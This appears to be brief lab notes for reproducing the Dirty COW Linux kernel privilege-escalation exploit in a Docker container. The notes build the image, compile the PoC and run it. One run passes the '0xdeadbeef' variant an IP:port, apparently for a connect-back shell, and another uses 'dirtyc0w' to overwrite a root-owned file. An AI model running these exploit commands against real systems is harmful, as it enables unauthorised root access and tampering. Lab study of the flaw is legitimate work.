# Dirty COW attack

# Build the container image
docker compose build
# docker-compose build

# Start the container
docker compose run d-cow bash

# Next
cd /dirtycow
make

./0xdeadbeef IP:port
./0xdeadbeef 172.18.0.2:5678


https://github.com/scotty-c/dirty-cow-poc
docker compose build d-c0w
docker compose up d-c0w
docker exec -it -u eureka d-c0w bash
./dirtyc0w root-data-file hacker-was-here